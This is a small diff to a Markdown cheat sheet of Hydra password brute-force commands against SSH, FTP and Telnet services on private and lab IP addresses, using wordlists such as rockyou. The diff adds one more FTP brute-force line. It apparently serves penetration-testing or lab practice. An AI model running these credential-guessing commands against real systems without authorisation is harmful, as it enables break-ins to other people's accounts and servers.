@@ -1,5 +1,7 @@
 # HYDRA
 
+
+
 # SSH (single user)
 hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -V -o hydra-ssh.txt ssh://192.168.1.100
 
@@ -8,6 +10,7 @@ hydra -L users.txt -P passlist.txt -M hosts.txt -t 2 -V -o hydra-ssh-multi.txt s
 
 # FTP (user list + passlist)
 hydra -L users.txt -P passwords.txt -t 6 -V -o hydra-ftp.txt ftp://192.168.1.50
+hydra -t 4 -l "username" -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
 
 # Telnet (single user)
 hydra -l admin -P /usr/share/wordlists/fast.txt -t 6 -V -o hydra-telnet.txt telnet://10.0.0.20
